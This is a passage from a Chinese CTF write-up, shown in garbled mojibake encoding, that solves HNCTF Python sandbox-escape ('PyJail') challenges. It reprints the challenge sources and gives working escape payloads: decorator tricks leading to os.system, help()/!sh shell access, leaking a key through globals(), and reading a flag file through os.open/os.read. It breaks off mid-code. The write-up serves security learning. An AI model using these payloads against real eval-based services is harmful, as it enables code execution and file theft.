<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; @exec</span><br><span class="line">... @input</span><br><span class="line">... class X:</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<p>æŠŠä»–ä»¬çš„æºç ä¹Ÿæ‰’ä¸‹æ¥äº†ï¼Œå˜»å˜»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    _       _ _   _                _                         _                _ ______ </span><br><span class="line">   (_)     (_) | | |              (_)                       | |              | |____  |</span><br><span class="line">    _  __ _ _| | | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |   / / </span><br><span class="line">   | |/ _` | | | | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__| | |/ _ \ \ / / _ \ |  / /  </span><br><span class="line">   | | (_| | | | | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ | / /   </span><br><span class="line">   | |\__,_|_|_| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|/_/    </span><br><span class="line">  _/ |                        __/ |                                                    </span><br><span class="line"> |__/                        |___/                                                     </span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def verify_ast_secure(m):</span><br><span class="line">  for x in ast.walk(m):</span><br><span class="line">    match type(x):</span><br><span class="line">      case (ast.Import|ast.ImportFrom|ast.Call|ast.Expr|ast.Add|ast.Lambda|ast.FunctionDef|ast.AsyncFunctionDef|ast.Sub|ast.Mult|ast.Div|ast.Del):</span><br><span class="line">        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line">  return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exexute_code(my_source_code):</span><br><span class="line">  print(&quot;Pls input your code: (last line must contain only --HNCTF)&quot;)</span><br><span class="line">  while True:</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    if line.startswith(&quot;--HNCTF&quot;):</span><br><span class="line">      break  </span><br><span class="line">    my_source_code += line</span><br><span class="line"></span><br><span class="line">  tree_check = compile(my_source_code, &quot;input_code.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">  if verify_ast_secure(tree_check):</span><br><span class="line">    print(&quot;check is passed!now the result is:&quot;)</span><br><span class="line">    compiled_code = compile(my_source_code, &quot;input_code.py&quot;, &#x27;exec&#x27;)</span><br><span class="line">    exec(compiled_code)</span><br><span class="line">  print(&quot;Press any key to continue&quot;)</span><br><span class="line">  sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  os.system(&quot;clear&quot;)</span><br><span class="line">  print(WELCOME)</span><br><span class="line">  print(&quot;=================================================================================================&quot;)</span><br><span class="line">  print(&quot;==           Welcome to the calc jail beginner level7,It&#x27;s AST challenge                       ==&quot;)</span><br><span class="line">  print(&quot;==           Menu list:                                                                        ==&quot;)</span><br><span class="line">  print(&quot;==             [G]et the blacklist AST                                                         ==&quot;)</span><br><span class="line">  print(&quot;==             [E]xecute the python code                                                       ==&quot;)</span><br><span class="line">  print(&quot;==             [Q]uit jail challenge                                                           ==&quot;)</span><br><span class="line">  print(&quot;=================================================================================================&quot;)</span><br><span class="line">  ans = (sys.stdin.readline().strip()).lower()</span><br><span class="line">  if ans == &#x27;g&#x27;:</span><br><span class="line">     print(&quot;=================================================================================================&quot;)</span><br><span class="line">     print(&quot;==        Black List AST:                                                                      ==&quot;)</span><br><span class="line">     print(&quot;==                       &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==&quot;)</span><br><span class="line">     print(&quot;==                        Sub,Mult,Div,Del&#x27;                                                    ==&quot;)</span><br><span class="line">     print(&quot;=================================================================================================&quot;)</span><br><span class="line">     print(&quot;Press any key to continue&quot;)</span><br><span class="line">     sys.stdin.readline()</span><br><span class="line">  elif ans == &#x27;e&#x27;:</span><br><span class="line">    my_source_code = &quot;&quot;</span><br><span class="line">    exexute_code(my_source_code)</span><br><span class="line">  elif ans == &#x27;q&#x27;:</span><br><span class="line">    print(&quot;Bye&quot;)</span><br><span class="line">    quit()</span><br><span class="line">  else:</span><br><span class="line">    print(&quot;Unknown options!&quot;)</span><br><span class="line">    quit()$ </span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™ä¸ªä¸œè¥¿è¿˜èƒ½ç”¨helpç›´æ¥è¿›å…¥å¸®åŠ©æ–‡æ¡£ï¼Œç„¶åæ‹¿ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@help</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>ç„¶å!shä¹Ÿèƒ½æ‹¿ä¸‹</p>
<h4 id="lake-lake-lake"><a href="#lake-lake-lake" class="headerlink" title="lake lake lake"></a>lake lake lake</h4><p>è¿›å…¥é¢˜ç›®æï¼Œè¿™ä¸ªç»™äº†æºç çš„ï¼Œç”±äºæˆ‘æ˜¯ä¹‹å‰åšå®Œäº†å‰é¢é‚£å‡ é“é¢˜æ‰æ¥åšçš„ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒå°å·«è§å¤§å·«äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#it seems have a backdoor</span><br><span class="line">#can u find the key of it and use the backdoor</span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    code = input(&quot;&gt;&quot;)</span><br><span class="line">    if(len(code)&gt;9):</span><br><span class="line">        return print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(code))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    print(&quot;Please enter the admin key&quot;)</span><br><span class="line">    key = input(&quot;&gt;&quot;)</span><br><span class="line">    if(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = input(&quot;&gt;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(code))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Nooo!!!!&quot;)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _       _          _       _          _       _        </span><br><span class="line"> | |     | |        | |     | |        | |     | |       </span><br><span class="line"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span><br><span class="line"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span><br><span class="line"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Now the program has two functions&quot;)</span><br><span class="line">print(&quot;can you use dockerdoor&quot;)</span><br><span class="line">print(&quot;1.func&quot;)</span><br><span class="line">print(&quot;2.backdoor&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if(input_data == &quot;1&quot;):</span><br><span class="line">    func()</span><br><span class="line">    exit(0)</span><br><span class="line">elif(input_data == &quot;2&quot;):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;not found the choice&quot;)</span><br><span class="line">    exit(0)</span><br></pre></td></tr></table></figure>

<p>OKæˆ‘ä»¬æ¥æµ…æµ…çš„åˆ†æä¸€ä¸‹funcå’Œbackdoor</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533813.png?raw=true" alt="image-20240607210544690"></p>
<p>funcï¼šå¯¹è¾“å…¥çš„payloadè¿›è¡Œé•¿åº¦æ£€éªŒï¼Œè‹¥å¤§äº9åˆ™æ‹¦æˆª</p>
<p>backdoor:å…ˆå¯¹keyè¿›è¡Œæ£€éªŒï¼Œè¿™é‡Œæœ‰ä¸ªå‡keyå’ŒçœŸkeyï¼ŒçœŸçš„åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™é‡Œæ²¡æœ‰å¯¹è¾“å…¥çš„payloadè¿›è¡Œé•¿åº¦é™åˆ¶ï¼ŒçŒœæƒ³å‡ºé¢˜äººæ˜¯æƒ³è®©æˆ‘ä»¬åœ¨è¿™åˆ©ç”¨</p>
<p>ä¸è¿‡ä¹Ÿç¡®å®ï¼Œä»”ç»†ä¸€æƒ³çš„è¯å¥½åƒè¿˜çœŸä¸èƒ½ç”¨è‚¾ä¹ˆ9ä¸ªå­—ä»¥å†…çš„payloadè¾¾åˆ°rceæ‰python</p>
<p>äºæ˜¯globals()ï¼Œåˆšå¥½ä¹ä¸ªå­—ç¬¦ï¼ŒæŸ¥æ‰¾å…¨å±€å˜é‡</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533377.png?raw=true" alt="image-20240607210851288"></p>
<p>è¿™keyä¸å°±å‡ºæ¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a34af94e88aed5c34fb5ccfe08cd14ab</span><br></pre></td></tr></table></figure>

<p>å“å‘€çœ‹é‚£ä¸ªçŸ¥ä¹çš„WPå†™çš„çœŸæ˜¯ç¥äººï¼Œç”¨ä»€ä¹ˆå¯†ç å­¦çš„æ–¹å¼å†™ï¼Œæˆ‘è¿™ç§èœçš„ç”¨å¯†ç æ€•ä¸æ˜¯è¦çˆ†é›¶</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533380.png?raw=true" alt="image-20240607212213071"></p>
<p>ä¹Ÿæ˜¯æ‹¿ä¸‹äº†</p>
<h4 id="l-ke-l-ke-l-ke"><a href="#l-ke-l-ke-l-ke" class="headerlink" title="l@ke l@ke l@ke"></a>l@ke l@ke l@ke</h4><p>è¿™é¢˜è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šå‘¢</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533464.png?raw=true" alt="image-20240607212520969"></p>
<p>funcçš„é™åˆ¶é•¿åº¦å˜æˆäº†6ç½¢äº†</p>
<p>æˆ‘è‡ªå·±ä»”ç»†ä¸€ç¢ç£¨ï¼Œhelp()ä¸æ˜¯åˆšå¥½å…­ä¸ªå­—ï¼Ÿ</p>
<p>ç§æˆ‘è¿™èªæ˜åŠ²</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533920.png?raw=true" alt="image-20240607212721708"></p>
<p>å“å‘€å¥½å§è¿˜æ˜¯æœ‰ç‚¹è ¢çš„ï¼Œæ€ä¹ˆè·‘å»çœ‹äººå®¶æ¨¡å—å»äº†å“ˆå“ˆå“ˆ</p>
<p>çœ‹server</p>
<p>![e6721a5e2f36a56e4a2cafed49808af](C:\Users\æ—éƒ‘æœ\Documents\WeChat Files\wxid_ong0ayoiddjn22\FileStorage\Temp\e6721a5e2f36a56e4a2cafed49808af.png)</p>
<p>é‚£ä¹ˆå¥½äº†å¥½äº†ï¼Œkeyæ‹¿åˆ°å“©</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">95c720690c2c83f0982ffba63ff87338</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533712.png?raw=true" alt="image-20240607213133709"></p>
<p>æˆ‘åƒï¼</p>
<h4 id="laKe-laKe-laKe"><a href="#laKe-laKe-laKe" class="headerlink" title="laKe laKe laKe"></a>laKe laKe laKe</h4><p>é¢˜ç›®ç»™äº†æºç é™„ä»¶ï¼Œå®¡ä»£ç å§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#You finsih these two challenge of leak</span><br><span class="line">#So cool</span><br><span class="line">#Now it&#x27;s time for laKe!!!!</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">from io import StringIO</span><br><span class="line">import sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [&#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line">open_func = open</span><br><span class="line"></span><br><span class="line">for m in BLACKED_LIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def my_audit_hook(event, _):</span><br><span class="line">    BALCKED_EVENTS = set(&#123;&#x27;pty.spawn&#x27;, &#x27;os.system&#x27;, &#x27;os.exec&#x27;, &#x27;os.posix_spawn&#x27;,&#x27;os.spawn&#x27;,&#x27;subprocess.Popen&#x27;&#125;)</span><br><span class="line">    if event in BALCKED_EVENTS:</span><br><span class="line">        raise RuntimeError(&#x27;Operation banned: &#123;&#125;&#x27;.format(event))</span><br><span class="line"></span><br><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br><span class="line">WELCOME=&#x27;&#x27;&#x27;</span><br><span class="line">  _       _  __      _       _  __      _       _  __    </span><br><span class="line"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span><br><span class="line"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span><br><span class="line"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span><br><span class="line"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span><br><span class="line">                                                         </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(WELCOME)</span><br><span class="line">    print(&#x27;Welcome to my guesser game!&#x27;)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    if game_score == 1:</span><br><span class="line">        print(&#x27;you are really super guesser!!!!&#x27;)</span><br><span class="line">        print(open_func(&#x27;flag&#x27;).read())</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Guess game end!!!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>banäº†osæ¨¡å—å¾ˆå¤šä¸œè¥¿ï¼Œsubprocessä¹Ÿbanäº†</p>
<p>è¯´æ˜¯æœ‰éé¢„æœŸï¼Œå› ä¸ºæ²¡banæ‰open</p>
<p>guesseréƒ¨åˆ†å‡½æ•°åˆ†æä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å…³æ³¨åˆ°ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œè¿™é‡Œç”¨äº†sys.stderrè¿›è¡Œç»“æœçš„é‡å®šå‘ï¼Œ</p>
<p><em># å°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°StringIOå¯¹è±¡ï¼ŒåŸå§‹æ ‡å‡†è¾“å‡ºä¿å­˜åœ¨challenge_original_stdoutå˜é‡ä¸­</em></p>
<p>å¼•å…¥çš„è¿™ä¸ªsysæ¨¡å—æœ¬èº«å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œè™½ç„¶æ˜¯ä¸ºäº†ä¿è¯audit hoookèƒ½å¤Ÿå‘æŒ¥é¢„æœŸä½œç”¨ï¼Œä½†åœ¨è¿™é‡Œçš„å®é™…åº”ç”¨ä¸Šå¹¶æ²¡æœ‰banæ‰æˆ‘ä»¬çš„è¯»å†™æ“ä½œ</p>
<p>payloadé›å½¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write()</span><br><span class="line">#åŠ¨æ€å¯¼å…¥sysæ¨¡å—ï¼Œå¹¶ä¸”ä»ä¸­è·å¾—stdoutå±æ€§ï¼Œstdoutä¸­ä¸ªå±æ€§æ˜¯ä¸€ä¸ªæ–‡ä»¶ç±»å¯¹è±¡ï¼Œä»£è¡¨æ ‡å‡†è¾“å‡ºæµï¼Œç„¶åç”¨stdoutå½“ä¸­çš„writeæ–¹æ³•å°†ç›®æ ‡æ•°æ®å†™å…¥</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªpayloadçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬writeæ–¹æ³•å°±åº”è¯¥å†™å…¥flagï¼Œè¿™æ ·flagå°±èƒ½è¢«å†™åˆ°stdoutå½“ä¸­ï¼Œè¢«æˆ‘ä»¬è¯»åˆ°</p>
<p>ç”¨os.openæ‰“å¼€æ–‡ä»¶ï¼Œç”¨os.readè¯»æ–‡ä»¶ï¼Œæˆ–è€…__import__(â€˜ioâ€™).open(â€œflagâ€).read()</p>
<p>å®Œæ•´payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;os&quot;).read(__import__(&quot;os&quot;).open(&quot;flag&quot;,__import__(&quot;os&quot;).O_RDONLY), 0x114).decode())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533668.png?raw=true" alt="image-20240612155112996"></p>
<p>æœ¬æ¥æ˜¯è¾“å‡ºä¸€æ®µåˆ¤æ–­ç»“æœçš„è¯­å¥ï¼Œä½†æ˜¯æˆ‘ä»¬æŠŠflagæ·»åŠ åˆ°äº†è¾“å‡ºå†…å®¹å½“ä¸­ï¼Œäºæ˜¯å°±ç»™æˆ‘ä»¬è¾“å‡ºäº†flag</p>
<p>ä½†æ˜¯çœ‹äººå®¶å¯†ç ä½¬çš„wpè¯´æ˜¯è¦ç”¨ä»€ä¹ˆæ¢…æ£®æ—‹è½¬æ³•è¿›è¡Œæ”»å‡»ï¼Œå“å‘€çœ‹ä¸æ‡‚ä¸€ç‚¹</p>
<p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸­ï¼ˆHNCTFé¢˜è§£ - WEEK2ï¼‰ - çŸ¥ä¹ (zhihu.com)</a></p>
<h4 id="lak3-lak3-lak3"><a href="#lak3-lak3-lak3" class="headerlink" title="lak3 lak3 lak3"></a>lak3 lak3 lak3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#Hi hackers,lak3 comes back</span><br><span class="line">#Have a good luck on it! :Wink:</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">from io import StringIO</span><br><span class="line">import sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [&#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line">open_func = open</span><br><span class="line"></span><br><span class="line">for m in BLACKED_LIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def my_audit_hook(event, _):</span><br><span class="line">    BALCKED_EVENTS = set(&#123;&#x27;pty.spawn&#x27;, &#x27;os.system&#x27;, &#x27;os.exec&#x27;, &#x27;os.posix_spawn&#x27;,&#x27;os.spawn&#x27;,&#x27;subprocess.Popen&#x27;,&#x27;code.__new__&#x27;,&#x27;function.__new__&#x27;,&#x27;cpython._PySys_ClearAuditHooks&#x27;,&#x27;open&#x27;&#125;)</span><br><span class="line">    if event in BALCKED_EVENTS:</span><br><span class="line">        raise RuntimeError(&#x27;Operation banned: &#123;&#125;&#x27;.format(event))</span><br><span class="line"></span><br><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        